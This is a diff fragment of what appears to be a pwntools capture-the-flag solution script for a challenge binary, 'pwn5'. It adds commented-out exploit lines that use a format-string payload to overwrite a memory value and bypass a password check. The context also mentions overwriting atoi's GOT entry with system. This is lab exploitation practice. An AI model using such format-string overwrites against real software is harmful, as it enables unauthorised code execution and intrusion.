@@ -23,6 +23,13 @@ your passwd:
 # r.recvuntil('your passwd:')
 # r.sendline(str(0x10101010))
 # r.interactive()
+# 或者直接使用fmtstr_payload修改0x804C044的值为0x1111
+# payload = fmtstr_payload(10, {0x804C044: 0x1111})
+# r.recvuntil('your name:')
+# r.sendline(payload)
+# r.recvuntil('your passwd:')
+# r.sendline(str(0x1111))
+# r.interactive()
 
 # method 3, 修改atoi的got表为system地址
 # elf = ELF("./pwn5")
